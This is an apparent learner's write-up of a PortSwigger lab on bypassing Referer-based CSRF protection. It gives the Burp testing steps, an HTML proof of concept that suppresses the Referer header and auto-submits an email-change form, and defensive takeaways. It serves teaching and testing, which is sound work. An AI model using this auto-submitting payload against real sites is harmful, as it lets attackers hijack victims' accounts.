# Lab Completed: CSRF - Bypassing Referer-Based Defenses

I recently completed the **Referer validation depends on header being present** lab. This was an insightful challenge that tested my ability to exploit web application vulnerabilities by understanding how HTTP headers are used for security. Here’s a detailed explanation of the process:

---

## 🔍 The Challenge

The server’s CSRF defense relied on validating the `Referer` header. If the header was present and originated from the legitimate site, the request was accepted. However, if the `Referer` header was absent, the server failed to validate the request properly. My task was to bypass this defense mechanism and perform a Cross-Site Request Forgery attack successfully.

---

## 🛠️ How I Solved It

### Step 1: Analyzing the Application’s Behavior
- Opened Burp's browser and logged into the account.
- Submitted the "Update email" form and located the resulting request in the Proxy history.
- Sent the request to Burp Repeater and tested modifying the `Referer` header.
  - When the domain in the `Referer` header was changed, the server rejected the request.
  - Deleting the `Referer` header entirely allowed the request to be accepted, revealing the vulnerability.

### Step 2: Crafting the Exploit

To bypass the defense, I created and hosted a proof-of-concept exploit using HTML. The exploit suppressed the `Referer` header and sent a malicious request to update the victim’s email address.

The HTML payload I used included the following:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
	<head> <meta name = "referrer" content = "never"></head>
  <body>
    <form action="https://0a2900b903daba1c82ea702f00450043.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="ner2&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Step 3: Hosting and Delivering the Exploit
- Hosted the exploit file on a server.
- Changed the email address in the payload to one that didn’t match my own.
- Used the "Deliver to victim" feature to simulate an attack and solve the lab.

---

## 🔑 Key Takeaways

1. **Headers Are Not Guaranteed:**
   Servers should not assume that headers like `Referer` will always be present. Browsers may omit them due to security policies or specific contexts.

2. **Use Defense-in-Depth:**
   Referer validation alone is insufficient for CSRF prevention. It should be combined with additional protections such as CSRF tokens.

3. **Leverage Browser Behavior:**
   Using features like `<meta name="referrer" content="no-referrer">` can help suppress headers and reveal vulnerabilities.

4. **Test Edge Cases:**
   Developers should thoroughly test applications to account for browser quirks and unexpected behavior that attackers might exploit.
